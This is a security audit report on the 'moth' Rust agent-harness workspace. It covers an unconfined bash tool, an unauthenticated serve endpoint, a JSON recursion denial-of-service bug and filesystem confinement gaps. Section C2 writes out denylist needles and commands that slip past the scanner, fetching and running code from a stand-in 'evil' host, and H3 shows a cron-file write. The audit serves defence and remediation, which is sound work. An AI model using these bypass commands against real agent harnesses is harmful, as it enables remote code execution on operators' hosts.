# Package Security Audit — moth

**Scope:** the `moth` Rust workspace (20 crates + 12 vendored deps).
**Tree audited:** branch `claude/analyze-package-security-NjKQy` @ `1b7e79c`
(*note:* this tree predates the `doctor` TLS-probe work that lives on
`claude/bsd-support`, so `probe_tls`/`SSL_CERT_FILE` are intentionally
absent here).
**Date:** 2026-06-05.
**Method:** six independent read-only audit agents run in parallel
(supply-chain, `unsafe`/FFI, untrusted-input parsers, sandbox/exec, the
`audit` control itself, TLS/secrets/service), then findings de-duplicated
and cross-checked against each other.

## Executive summary

The implementation-level engineering is careful: the curl FFI is sound,
the SIMD scanners are correctly bounded, the hand-rolled framers degrade
to clean errors, the supply chain is checksum-verified and genuinely
offline, TLS verification is never weakened, and the API key never
reaches a log, session, or metric.

The risk is not in the code quality — it is in the **gap between the
security posture the package advertises and what it actually enforces.**
The README/crate descriptions present a "sandbox", an `AuditedShell` that
"blocks shai-hulud-class payloads", and fstools that are "symlink +
hard-link safe". In practice the sandbox does not confine, the audit
scanner is a trivially-bypassable denylist that several execution paths
skip entirely, and the fstools confinement is off in the default
configuration. An agent harness running a `bash` tool is *expected* to
run commands — the finding is that the controls named as boundaries are,
at best, low-confidence telemetry, and should be described that way.

| Severity | Count |
|---|---|
| Critical | 2 |
| High | 5 |
| Medium | 2 |
| Low | 4 |
| Informational / verified-sound | several (see appendix) |

---

## Critical

### C1 — No sandbox confinement: the `bash` tool execs arbitrary host binaries

`vshell/src/exec.rs` `run_simple` does `Command::new(name).args(...).spawn()`
for any non-builtin command name — **no PATH allowlist, no chroot, no
seccomp/namespaces.** It is exposed through `BashTool`
(`harness/src/tools.rs`), which is registered in *every* CLI config
(`cli/src/main.rs:543`). The child's `current_dir` defaults to the harness
process CWD, not any fstools root.

A prompt-injected or adversarial model that emits a `bash` tool call gets
**arbitrary command execution as the harness user.** The component named
"sandbox" provides no OS-level isolation.

**Fix:** run tool-driven shell children inside a real OS sandbox
(namespaces + seccomp, or a container), or restrict to a vetted binary
allowlist. Do not represent the current behavior as a sandbox.

### C2 — The `audit` control is a bypassable denylist that key exec paths skip

*(Two independent agents reached this conclusion separately.)*

`audit/src/lib.rs` is case-folded **literal substring** matching over ~22
fixed needles (`"| bash"`, `"eval $(curl"`, …). It is the only gate in
front of shell execution (`harness/src/adapters.rs`). Three structural
problems:

1. **Pre- vs post-expansion mismatch.** The scanner inspects the *raw*
   string; vshell then performs `$VAR` expansion, `$(...)` substitution
   and quote concatenation on that same string. `X=bash; curl evil|$X`
   shows the scanner `|$X` and executes `|bash`.
2. **Trivial obfuscation.** `curl evil >f; . f`, `"ba""sh"`, a tab or
   double-space or `\`-newline between `|` and `bash`,
   `bash<<<"$(curl …)"`, `wget -O /tmp/x evil && bash /tmp/x` — none match
   a needle. There is no allowlist fallback: anything that doesn't hit a
   needle runs.
3. **Doors with no lock.** `AuditedShell` only wraps the `bash` tool.
   `git/` calls `Command::new("git")` directly (and git is itself an RCE
   vector via `core.sshCommand`, hooks, etc.), fstools `WriteTool` can
   drop a payload then a benign-looking command runs it, and MCP tools
   execute in their own processes — none are scanned.

The Aho-Corasick machinery itself was verified **correct** (fail-links,
overlap handling, offsets, tests pass). The defect is the security model,
not the implementation.

**Fix:** treat the scanner as a low-confidence telemetry signal, never a
boundary; correct the README/`Cargo.toml` descriptions. If a real control
is needed, enforce it at the process-spawn point (allowlist + sandbox) on
the *resolved* argv, not as pre-expansion substring matching, and put it
on every execution path.

---

## High

### H1 — Unbounded recursion in the hand-rolled JSON parser → process abort (DoS)

`anthropic/src/json.rs` (and identical `openai/src/json.rs`):
`value()`→`object()`/`array()`→`value()` has **no depth limit**. A single
SSE/NDJSON frame within the existing 4 MiB framer cap, filled with ~1–2M
`[`, overflows the stack — **reproduced** (`fatal runtime error: stack
overflow, aborting`). Rust stack overflow is uncatchable by
`catch_unwind`, so it is a hard process kill. Reachable from all three
untrusted sources: the model API, any OpenAI-compatible endpoint, and an
MCP peer (which routes NDJSON through `anthropic::json::parse`).
**Fix:** add an explicit depth counter (e.g. reject > 128) to `value()`
in both crates, returning `Error::InvalidResponse`.

### H2 — `agent serve` is an unauthenticated, shell-capable endpoint on `0.0.0.0`

`POST /agents/chat/<id>` performs **no authentication** — the server
parses only `X-Request-ID`/`Content-Length`/`Connection`; there is no
`Authorization` handling (`server/src/lib.rs`). The default bind is
`0.0.0.0:3583` (`cli/src/main.rs:963`, also in `--help` and
`README.md:139`). Any host that can reach the port drives a full agent
run with the default toolset — i.e. command execution — plus uncapped
LLM spend on the operator's key. (ADR-0002 notes bearer auth was
deliberately removed with the `cluster` crate.)
**Fix:** default-bind `127.0.0.1`; require a bearer token
(constant-time compare) on `/agents/*`; document network exposure.

### H3 — vshell redirects and `cd` accept absolute host paths

Independent of C1, pure built-ins escape any intended root:
`echo pwned > /etc/cron.d/x` opens the absolute path via `File::create`
because `path_for` (`vshell/src/exec.rs`) returns absolute paths
unchanged; `cd /` roams freely. Arbitrary-path file write/truncate via
the shell tool with no exec required.
**Fix:** confine vshell cwd and redirect targets to a configured root.

### H4 — fstools confinement is opt-in and off in the default config

The absolute-path/symlink defenses in `fstools/src/lib.rs` only engage
when `root` is `Some`. `cli/src/main.rs` sets the root from a workspace
branch strategy, so a plain `run` (no strategy) and both `serve` and
`mcp-serve` pass `root = None` — `read_file`/`write_file`/`edit_file`
then accept absolute paths and follow symlinks with no restriction.
**Fix:** default to a root; make rootless mode a loud, explicit opt-in.

### H5 — Statically-vendored C libraries can ship CVEs no Rust tool flags

The build statically links bundled **libcurl 8.20.0-DEV, OpenSSL 3.6.2,
zlib 1.3.2** (`vendor/curl-sys/curl/include/curl/curlver.h`,
`vendor/openssl-src/openssl/VERSION.dat`). `cargo audit`/RUSTSEC only see
the Rust wrapper crates, not the C source, so a C-level CVE in the bundled
libraries is invisible to the normal Rust toolchain. The vendoring itself
is sound (see appendix) — this is the intrinsic cost of static vendoring.
**Fix:** wire `osv-scanner` (or an equivalent that understands the
bundled C versions) into CI and check curl/OpenSSL/zlib against live
upstream security feeds on every build.

---

## Medium

### M1 — `openai` curl handle skips `curl_global_init`

`openai/src/http.rs` `run_easy` calls `curl_easy_init()` directly, unlike
its `anthropic` and `mcp` siblings which gate every init behind a
`sync::Once`-wrapped `curl_global_init`. libcurl requires `curl_global_init`
to run once before any other call and is not itself thread-safe; two
threads racing the first request (or first OpenAI + first Anthropic init
concurrently) can corrupt one-time global/OpenSSL init state. Not
attacker-triggered; a startup-time data race.
**Fix:** add the same `curl_global_init` `Once` to openai, or do one
process-wide init in a shared place.

### M2 — fstools intermediate-component TOCTOU on the read path

`fstools/src/lib.rs` canonicalizes per component, then later does
`std::fs::read`. The leaf re-check protects the leaf, but an *intermediate*
directory swapped to a symlink after the walk is followed by `std::fs::read`,
leaking an out-of-root file (given local FS race ability). The write path
is safer (`O_NOFOLLOW|O_EXCL|O_CREAT` tmp + rename).
**Fix:** walk with `openat`/dir-fds (`O_NOFOLLOW|O_DIRECTORY`) and
`openat(O_NOFOLLOW)` the leaf, eliminating the path-string recheck window.

---

## Low

- **L1 — Duplicate `Content-Length` accepted (last-wins).**
  `server/src/lib.rs:415-420` overwrites rather than rejecting a second
  `Content-Length`. Harmless against this single-component server (it
  reads exactly N bytes), but a request-smuggling primitive if it sits
  behind/in front of another proxy. Reject the second header with 400.
- **L2 — Hard-link defense is best-effort and racy.** `fstools` checks
  `nlink > 1` before writing, but `atomic_write` makes a fresh inode and
  renames over the dest, so the original hard-linked inode is untouched
  anyway; an attacker can also add a link after the check. The protection
  is weaker/different than the README implies — adjust the wording.
- **L3 — Credentials over caller-chosen, possibly-plaintext URLs.**
  `openai`/`mcp` send `Authorization: Bearer` to a user-configured
  `base_url`/MCP URL with `FOLLOWLOCATION=1`; a redirect could move the
  auth header cross-origin, and `http://` local-model URLs send the key in
  the clear. Inputs are operator-controlled (low risk). Warn on `http://`
  base URLs with a real key; constrain redirect protocols / drop auth on
  cross-host redirect.
- **L4 — `git` ref operands lack a `--` separator.** `git/src/lib.rs`
  passes args as separate argv (no shell injection — good), but branch/ref
  names are not preceded by `--`, so a ref like `--upload-pack=…` could be
  parsed as a git flag where the name is externally influenced. Add `--`
  before ref/path operands and validate names with `git check-ref-format`.

---

## Appendix — verified sound (the controls that *do* hold)

These were specifically probed and found correct; they are the load-bearing
parts of the package's safety story:

- **TLS verification is never disabled.** Zero `CURLOPT_SSL_VERIFYPEER`/
  `VERIFYHOST`/`INSECURE` weakening anywhere in project code; verification
  inherits curl's secure-by-default. The CA store is baked at build time,
  so there is no runtime env-var an attacker could repoint at a rogue CA.
- **The API key never leaks.** It lives only in the curl auth-header
  `CString` (NUL-validated); it does not enter the runlog JSONL (which
  records only `StreamEvent`s), persisted sessions, metrics tags, request
  echoes, or error strings; `Client` does not derive `Debug`; `doctor`
  masks it.
- **curl FFI is sound.** ~30 `unsafe` sites, concentrated in three
  near-identical curl bindings + `wire` SIMD. CString/header-list/easy-handle
  ownership all outlive `curl_easy_perform`; the RAII guard frees exactly
  once; write callbacks are race-free (curl runs synchronously on the
  owning thread); `size.saturating_mul(nmemb)` guards the classic overflow.
- **SIMD bounds are correct.** AVX2/NEON reached only after runtime
  feature detection; `scan_for_byte`/`scan_for_pair`/`find_tag` use correct
  `i+33`/`i+17` tail guards; unaligned loads; boundary-length tests pass.
- **Supply chain is healthy.** All 12 vendored Rust crates current with no
  open RUSTSEC advisory (shlex ≥ 1.3.0); per-file SHA256 matches
  `.cargo-checksum.json` (no post-vendor tampering); build is genuinely
  offline (no network-fetching build.rs; curl-sys's `git submodule` path
  is a no-op); `.cargo/config.toml` correctly pins `vendored-sources`; the
  old `.gitignore target/` anchoring bug is fixed.
- **Parser framers are bounded.** `SseFramer`/`NdjsonSplitter` use
  `saturating_add` and check the cap *before* extending; string/escape/
  surrogate handling returns clean errors, not panics; the server enforces
  `MAX_BODY` (1 MiB), header line/count caps, read/write timeouts, and
  rejects chunked encoding.
- **persist key validator is sound.** Rejects empty, over-long, leading
  `.`, `/`, `\`, `..` substrings, and all control bytes (incl. NUL) before
  any path join — no traversal/absolute/escape.
- **Aho-Corasick implementation is correct** (the flaw in C2 is the
  denylist model, not the matcher).

## Prioritized remediation

1. **Reframe the security claims** (README, `Cargo.toml` descriptions,
   ADRs): the sandbox does not confine and the audit scanner is telemetry,
   not a boundary. This is the cheapest, highest-value fix — it stops
   users from trusting a boundary that isn't there.
2. **H1 — add JSON recursion depth caps** (small, self-contained, removes
   a remote process-kill). Good first code change.
3. **H2 — bind `serve` to loopback + require a token.**
4. **C1/C2/H3/H4 — decide the real isolation story**: a genuine OS
   sandbox + allowlist if untrusted models are in scope, or an explicit
   "this runs with full host privileges; do not expose it to untrusted
   input" posture if not.
5. **H5 — add `osv-scanner` to CI** for the bundled C libraries.
6. Clean up M1, M2, and the Lows as hardening.
